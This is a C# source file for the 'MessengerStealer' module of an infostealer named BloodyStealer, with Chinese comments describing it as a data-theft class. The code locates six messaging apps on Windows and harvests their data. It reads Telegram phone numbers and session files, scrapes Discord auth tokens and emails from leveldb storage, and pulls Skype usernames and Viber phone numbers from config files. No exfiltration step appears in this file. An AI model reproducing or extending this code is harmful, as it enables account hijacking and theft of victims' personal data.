using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace BloodyStealer.Stealers
{
    /// <summary>
    /// 即时通讯应用数据窃取类，收集Telegram、Discord等通讯软件的信息
    /// </summary>
    internal class MessengerStealer
    {
        #region 数据结构

        /// <summary>
        /// 即时通讯应用类型
        /// </summary>
        public enum MessengerType
        {
            Telegram,
            Discord,
            Skype,
            WhatsApp,
            Signal,
            Viber
        }

        /// <summary>
        /// 即时通讯应用账户信息
        /// </summary>
        public class MessengerAccount
        {
            public MessengerType Type { get; set; }
            public string Username { get; set; }
            public string PhoneNumber { get; set; }
            public string Email { get; set; }
            public string SessionToken { get; set; }
            public string InstallPath { get; set; }
            public Dictionary<string, string> ExtraData { get; set; } = new Dictionary<string, string>();
        }

        /// <summary>
        /// 即时通讯对话记录信息
        /// </summary>
        public class ChatMessage
        {
            public MessengerType Type { get; set; }
            public string Sender { get; set; }
            public string Receiver { get; set; }
            public string Content { get; set; }
            public DateTime? Timestamp { get; set; }
        }

        #endregion

        #region 属性和字段

        /// <summary>
        /// 收集到的即时通讯账户列表
        /// </summary>
        public List<MessengerAccount> Accounts { get; private set; } = new List<MessengerAccount>();

        /// <summary>
        /// 收集到的聊天消息列表
        /// </summary>
        public List<ChatMessage> Messages { get; private set; } = new List<ChatMessage>();

        /// <summary>
        /// 已安装的即时通讯应用列表
        /// </summary>
        public List<MessengerType> InstalledMessengers { get; private set; } = new List<MessengerType>();

        /// <summary>
        /// 即时通讯应用安装路径字典
        /// </summary>
        private Dictionary<MessengerType, string> _messengerPaths = new Dictionary<MessengerType, string>();

        #endregion

        #region 构造函数

        /// <summary>
        /// 初始化即时通讯应用数据窃取器
        /// </summary>
        public MessengerStealer()
        {
            DetectInstalledMessengers();
        }

        /// <summary>
        /// 检测已安装的即时通讯应用
        /// </summary>
        private void DetectInstalledMessengers()
        {
            try
            {
                // Telegram
                string telegramPath = GetTelegramPath();
                if (!string.IsNullOrEmpty(telegramPath))
                {
                    _messengerPaths[MessengerType.Telegram] = telegramPath;
                    InstalledMessengers.Add(MessengerType.Telegram);
                }

                // Discord
                string discordPath = GetDiscordPath();
                if (!string.IsNullOrEmpty(discordPath))
                {
                    _messengerPaths[MessengerType.Discord] = discordPath;
                    InstalledMessengers.Add(MessengerType.Discord);
                }

                // Skype
                string skypePath = GetSkypePath();
                if (!string.IsNullOrEmpty(skypePath))
                {
                    _messengerPaths[MessengerType.Skype] = skypePath;
                    InstalledMessengers.Add(MessengerType.Skype);
                }

                // WhatsApp
                string whatsAppPath = GetWhatsAppPath();
                if (!string.IsNullOrEmpty(whatsAppPath))
                {
                    _messengerPaths[MessengerType.WhatsApp] = whatsAppPath;
                    InstalledMessengers.Add(MessengerType.WhatsApp);
                }

                // Signal
                string signalPath = GetSignalPath();
                if (!string.IsNullOrEmpty(signalPath))
                {
                    _messengerPaths[MessengerType.Signal] = signalPath;
                    InstalledMessengers.Add(MessengerType.Signal);
                }

                // Viber
                string viberPath = GetViberPath();
                if (!string.IsNullOrEmpty(viberPath))
                {
                    _messengerPaths[MessengerType.Viber] = viberPath;
                    InstalledMessengers.Add(MessengerType.Viber);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error detecting messaging apps: {ex.Message}");
            }
        }

        #endregion

        #region 公共方法

        /// <summary>
        /// 窃取所有即时通讯应用数据
        /// </summary>
        public void StealAll()
        {
            try
            {
                foreach (MessengerType type in InstalledMessengers)
                {
                    switch (type)
                    {
                        case MessengerType.Telegram:
                            StealTelegramData();
                            break;
                        case MessengerType.Discord:
                            StealDiscordData();
                            break;
                        case MessengerType.Skype:
                            StealSkypeData();
                            break;
                        case MessengerType.WhatsApp:
                            StealWhatsAppData();
                            break;
                        case MessengerType.Signal:
                            StealSignalData();
                            break;
                        case MessengerType.Viber:
                            StealViberData();
                            break;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error in StealAll: {ex.Message}");
            }
        }

        /// <summary>
        /// 获取收集到的统计信息
        /// </summary>
        /// <returns>统计信息字符串</returns>
        public string GetStatistics()
        {
            Dictionary<MessengerType, int> accountCounts = new Dictionary<MessengerType, int>();

            foreach (MessengerAccount account in Accounts)
            {
                if (!accountCounts.ContainsKey(account.Type))
                {
                    accountCounts[account.Type] = 0;
                }
                accountCounts[account.Type]++;
            }

            StringBuilder sb = new StringBuilder();
            sb.AppendLine($"已安装即时通讯应用: {InstalledMessengers.Count}");
            sb.AppendLine($"收集到的账户: {Accounts.Count}");
            sb.AppendLine($"收集到的聊天消息: {Messages.Count}");

            foreach (var pair in accountCounts)
            {
                sb.AppendLine($"{pair.Key}: {pair.Value}");
            }

            return sb.ToString();
        }

        #endregion

        #region 私有方法 - 路径检测

        private string GetTelegramPath()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string telegramDesktopPath = Path.Combine(appData, "Telegram Desktop");

                if (Directory.Exists(telegramDesktopPath))
                {
                    return telegramDesktopPath;
                }

                return null;
            }
            catch
            {
                return null;
            }
        }

        private string GetDiscordPath()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string discordPath = Path.Combine(appData, "Discord");
                
                if (Directory.Exists(discordPath))
                {
                    return discordPath;
                }
                
                return null;
            }
            catch
            {
                return null;
            }
        }

        private string GetSkypePath()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string skypePath = Path.Combine(appData, "Skype");
                
                if (Directory.Exists(skypePath))
                {
                    return skypePath;
                }
                
                return null;
            }
            catch
            {
                return null;
            }
        }

        private string GetWhatsAppPath()
        {
            try
            {
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string whatsAppPath = Path.Combine(localAppData, "WhatsApp");
                
                if (Directory.Exists(whatsAppPath))
                {
                    return whatsAppPath;
                }
                
                return null;
            }
            catch
            {
                return null;
            }
        }

        private string GetSignalPath()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string signalPath = Path.Combine(appData, "Signal");
                
                if (Directory.Exists(signalPath))
                {
                    return signalPath;
                }
                
                return null;
            }
            catch
            {
                return null;
            }
        }

        private string GetViberPath()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string viberPath = Path.Combine(appData, "ViberPC");
                
                if (Directory.Exists(viberPath))
                {
                    return viberPath;
                }
                
                return null;
            }
            catch
            {
                return null;
            }
        }

        #endregion

        #region 应用数据窃取

        /// <summary>
        /// 窃取Telegram数据
        /// </summary>
        private void StealTelegramData()
        {
            try
            {
                string telegramPath = _messengerPaths[MessengerType.Telegram];
                
                if (string.IsNullOrEmpty(telegramPath) || !Directory.Exists(telegramPath))
                {
                    return;
                }
                
                // 查找D877F783D5D3EF8C*文件夹，这是Telegram的数据文件夹
                string[] tDataFolders = Directory.GetDirectories(telegramPath)
                    .Where(dir => Path.GetFileName(dir).StartsWith("D877F783D5D3EF8C"))
                    .ToArray();
                
                if (tDataFolders.Length == 0)
                {
                    return;
                }

                foreach (string tDataFolder in tDataFolders)
                {
                    // 提取配置文件信息
                    try
                    {
                        string mapFile = Path.Combine(tDataFolder, "map");
                        
                        if (File.Exists(mapFile))
                        {
                            // Telegram的map文件保存了电话号码和其他标识符的映射关系
                            byte[] fileContent = File.ReadAllBytes(mapFile);
                            string mapContent = Encoding.UTF8.GetString(fileContent);
                            
                            // 尝试提取电话号码（这是一个简化的提取方法，实际上需要更复杂的解析）
                            var phoneNumbers = Regex.Matches(mapContent, @"\+\d{1,15}")
                                .Cast<Match>()
                                .Select(m => m.Value)
                                .Distinct()
                                .ToList();
                            
                            if (phoneNumbers.Count > 0)
                            {
                                var account = new MessengerAccount
                                {
                                    Type = MessengerType.Telegram,
                                    PhoneNumber = phoneNumbers.FirstOrDefault(),
                                    InstallPath = telegramPath,
                                    ExtraData = new Dictionary<string, string>
                                    {
                                        { "DataFolder", tDataFolder }
                                    }
                                };
                                
                                Accounts.Add(account);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error extracting Telegram map file: {ex.Message}");
                    }
                    
                    // 提取会话文件
                    try
                    {
                        string[] sessionFiles = Directory.GetFiles(tDataFolder, "*.session");
                        
                        foreach (string sessionFile in sessionFiles)
                        {
                            var account = new MessengerAccount
                            {
                                Type = MessengerType.Telegram,
                                InstallPath = telegramPath,
                                ExtraData = new Dictionary<string, string>
                                {
                                    { "DataFolder", tDataFolder },
                                    { "SessionFile", sessionFile }
                                }
                            };
                            
                            // 如果这个账户的电话号码尚未添加，添加它
                            if (!Accounts.Any(a => a.Type == MessengerType.Telegram && 
                                          a.ExtraData.ContainsKey("DataFolder") && 
                                          a.ExtraData["DataFolder"] == tDataFolder))
                            {
                                Accounts.Add(account);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error extracting Telegram session files: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing Telegram data: {ex.Message}");
            }
        }

        /// <summary>
        /// 窃取Discord数据
        /// </summary>
        private void StealDiscordData()
        {
            try
            {
                string discordPath = _messengerPaths[MessengerType.Discord];
                
                if (string.IsNullOrEmpty(discordPath) || !Directory.Exists(discordPath))
                {
                    return;
                }
                
                // Discord在本地存储中保存令牌和其他数据
                string localStoragePath = Path.Combine(discordPath, "Local Storage", "leveldb");
                
                if (!Directory.Exists(localStoragePath))
                {
                    return;
                }
                
                try
                {
                    // 获取所有leveldb文件
                    string[] leveldbFiles = Directory.GetFiles(localStoragePath, "*.ldb")
                        .Concat(Directory.GetFiles(localStoragePath, "*.log"))
                        .ToArray();
                    
                    foreach (string file in leveldbFiles)
                    {
                        byte[] content = File.ReadAllBytes(file);
                        string fileContent = Encoding.UTF8.GetString(content);
                        
                        // 尝试查找Discord令牌（格式通常是Base64编码字符串）
                        var tokens = Regex.Matches(fileContent, "([a-zA-Z0-9\\-\\_]{24}\\.[a-zA-Z0-9\\-\\_]{6}\\.[a-zA-Z0-9\\-\\_]{27}|mfa\\.[a-zA-Z0-9\\-\\_]{84})")
                            .Cast<Match>()
                            .Select(m => m.Value)
                            .Distinct()
                            .ToList();
                        
                        // 尝试查找邮箱地址
                        var emails = Regex.Matches(fileContent, @"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b")
                            .Cast<Match>()
                            .Select(m => m.Value)
                            .Distinct()
                            .ToList();
                        
                        foreach (string token in tokens)
                        {
                            var account = new MessengerAccount
                            {
                                Type = MessengerType.Discord,
                                SessionToken = token,
                                InstallPath = discordPath,
                                Email = emails.FirstOrDefault()
                            };
                            
                            Accounts.Add(account);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error extracting Discord tokens: {ex.Message}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing Discord data: {ex.Message}");
            }
        }

        /// <summary>
        /// 窃取Skype数据
        /// </summary>
        private void StealSkypeData()
        {
            try
            {
                string skypePath = _messengerPaths[MessengerType.Skype];
                
                if (string.IsNullOrEmpty(skypePath) || !Directory.Exists(skypePath))
                {
                    return;
                }
                
                // 在AppData/Roaming/Skype文件夹中找到用户数据目录
                string[] userFolders = Directory.GetDirectories(skypePath);
                
                foreach (string userFolder in userFolders)
                {
                    string folderName = Path.GetFileName(userFolder);
                    
                    // 排除shared_* 文件夹
                    if (folderName.StartsWith("shared_"))
                    {
                        continue;
                    }
                    
                    // config.xml包含账户信息
                    string configFile = Path.Combine(userFolder, "config.xml");
                    
                    if (File.Exists(configFile))
                    {
                        try
                        {
                            string content = File.ReadAllText(configFile);
                            
                            // 提取Skype用户名和显示名称
                            var skypeNames = Regex.Matches(content, "<SkypeName>([^<]+)</SkypeName>")
                                .Cast<Match>()
                                .Select(m => m.Groups[1].Value)
                                .ToList();
                            
                            var displayNames = Regex.Matches(content, "<DisplayName>([^<]+)</DisplayName>")
                                .Cast<Match>()
                                .Select(m => m.Groups[1].Value)
                                .ToList();
                            
                            var emails = Regex.Matches(content, "<Email>([^<]+)</Email>")
                                .Cast<Match>()
                                .Select(m => m.Groups[1].Value)
                                .ToList();
                            
                            if (skypeNames.Count > 0)
                            {
                                var account = new MessengerAccount
                                {
                                    Type = MessengerType.Skype,
                                    Username = skypeNames.FirstOrDefault(),
                                    Email = emails.FirstOrDefault(),
                                    InstallPath = skypePath,
                                    ExtraData = new Dictionary<string, string>()
                                };
                                
                                if (displayNames.Count > 0)
                                {
                                    account.ExtraData["DisplayName"] = displayNames.FirstOrDefault();
                                }
                                
                                Accounts.Add(account);
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error extracting Skype config: {ex.Message}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing Skype data: {ex.Message}");
            }
        }

        /// <summary>
        /// 窃取WhatsApp数据
        /// </summary>
        private void StealWhatsAppData()
        {
            // 简化实现，仅记录安装路径
            try
            {
                string whatsAppPath = _messengerPaths[MessengerType.WhatsApp];
                
                if (string.IsNullOrEmpty(whatsAppPath) || !Directory.Exists(whatsAppPath))
                {
                    return;
                }
                
                var account = new MessengerAccount
                {
                    Type = MessengerType.WhatsApp,
                    InstallPath = whatsAppPath
                };
                
                Accounts.Add(account);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing WhatsApp data: {ex.Message}");
            }
        }

        /// <summary>
        /// 窃取Signal数据
        /// </summary>
        private void StealSignalData()
        {
            // 简化实现，仅记录安装路径
            try
            {
                string signalPath = _messengerPaths[MessengerType.Signal];
                
                if (string.IsNullOrEmpty(signalPath) || !Directory.Exists(signalPath))
                {
                    return;
                }
                
                var account = new MessengerAccount
                {
                    Type = MessengerType.Signal,
                    InstallPath = signalPath
                };
                
                Accounts.Add(account);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing Signal data: {ex.Message}");
            }
        }

        /// <summary>
        /// 窃取Viber数据
        /// </summary>
        private void StealViberData()
        {
            // 简化实现，仅记录安装路径
            try
            {
                string viberPath = _messengerPaths[MessengerType.Viber];
                
                if (string.IsNullOrEmpty(viberPath) || !Directory.Exists(viberPath))
                {
                    return;
                }
                
                // 尝试从配置文件中提取电话号码
                string configPath = Path.Combine(viberPath, "config");
                
                if (Directory.Exists(configPath))
                {
                    string[] jsonFiles = Directory.GetFiles(configPath, "*.json");
                    
                    foreach (string file in jsonFiles)
                    {
                        try
                        {
                            string content = File.ReadAllText(file);
                            
                            // 查找电话号码
                            var phoneMatch = Regex.Match(content, "\"phoneNumber\"\\s*:\\s*\"([^\"]+)\"");
                            
                            if (phoneMatch.Success)
                            {
                                var account = new MessengerAccount
                                {
                                    Type = MessengerType.Viber,
                                    PhoneNumber = phoneMatch.Groups[1].Value,
                                    InstallPath = viberPath
                                };
                                
                                Accounts.Add(account);
                                break;
                            }
                        }
                        catch
                        {
                            // 忽略单个文件的错误
                        }
                    }
                }
                
                // 如果没有找到电话号码，只添加安装路径
                if (!Accounts.Any(a => a.Type == MessengerType.Viber))
                {
                    var account = new MessengerAccount
                    {
                        Type = MessengerType.Viber,
                        InstallPath = viberPath
                    };
                    
                    Accounts.Add(account);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing Viber data: {ex.Message}");
            }
        }

        #endregion
    }
} 